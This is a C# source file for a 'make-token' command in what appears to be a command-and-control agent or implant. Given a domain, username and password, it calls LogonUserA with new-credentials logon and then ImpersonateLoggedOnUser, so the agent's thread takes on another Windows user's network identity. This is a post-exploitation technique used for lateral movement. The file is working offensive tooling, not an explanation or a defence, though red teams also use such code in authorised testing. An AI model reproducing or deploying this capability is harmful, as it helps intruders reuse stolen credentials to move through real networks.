using Agent.Models;
using System;

using System.Security.Principal;


namespace Agent.Commands
{
    public class MakeToken : AgentsCommand
    {
        public override string Name => "make-token";
        public override string Execute(AgentTask task)
        {

            //make-tokrtn DOMAIN\Username Passwoen
            var userDomain = task.Arguments[0];
            var password =task.Arguments[1];
            
            var split =userDomain.Split('\\');
            var domain = split[0];
            var username = split[1];
            var hToken = IntPtr.Zero;
           if( Native.Advapi.LogonUserA(username,domain,password ,Native.Advapi.LegonProvider.LOGON32_LOGON_NEW_CREDENTIALS, Native.Advapi.LogonUserProvider.LOGON32_PROVIDER_DEFAULT,ref hToken))
            {
                if (Native.Advapi.ImpersonateLoggedOnUser(hToken))
                {
                    var identity = new WindowsIdentity(hToken);
                    return $"Successfullt impersonated {identity.Name}";

                }
                return $"Seccessfullt made token,but failed to impersonate ";

            }
            return "failled to make token ";
        }


    }
}
